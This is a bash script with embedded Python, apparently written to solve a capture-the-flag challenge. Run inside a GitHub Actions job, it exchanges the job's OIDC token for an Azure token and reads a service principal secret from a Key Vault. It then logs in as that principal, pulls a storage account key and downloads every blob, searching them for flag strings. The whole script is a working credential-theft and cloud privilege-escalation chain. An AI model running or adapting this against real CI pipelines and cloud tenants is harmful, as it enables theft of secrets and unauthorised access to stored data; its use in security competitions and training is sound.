#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jget(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jget(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
spc=json.loads(jget(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{spc.get('tenantId',TEN)}/oauth2/v2.0/token",
  {"client_id":spc["appId"],"client_secret":spc["clientSecret"],
   "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
ARM=jget(b)["access_token"]
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
          f"providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01",
          data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
open("/tmp/stkey","w").write(jget(b)["keys"][0]["value"])
print("storage key retrieved:", st)
PYEOF

KEY=$(cat /tmp/stkey); ACCT=sttblcilogsprodx3euoz
echo "=== containers ==="
az storage container list --account-name "$ACCT" --account-key "$KEY" --query "[].name" -o tsv 2>&1 | tee /tmp/conts
echo
while read -r C; do
  [ -z "$C" ] && continue
  echo "=== container: $C ==="
  az storage blob list -c "$C" --account-name "$ACCT" --account-key "$KEY" --query "[].name" -o tsv 2>&1 | head -200 | tee /tmp/blobs
  while read -r B; do
    [ -z "$B" ] && continue
    az storage blob download -c "$C" -n "$B" --account-name "$ACCT" --account-key "$KEY" -f /tmp/blob.bin --overwrite -o none 2>/dev/null
    if grep -aoiE '(DF26|flag|CTF)\{[^}]{0,200}\}' /tmp/blob.bin 2>/dev/null | head -3 | grep -q .; then
      echo "  [FLAG] $C/$B"
      grep -aoiE '(DF26|flag|CTF)\{[^}]{0,200}\}' /tmp/blob.bin | sort -u | head -5
    fi
  done < /tmp/blobs
done < /tmp/conts
rm -f /tmp/stkey
echo "=== done ==="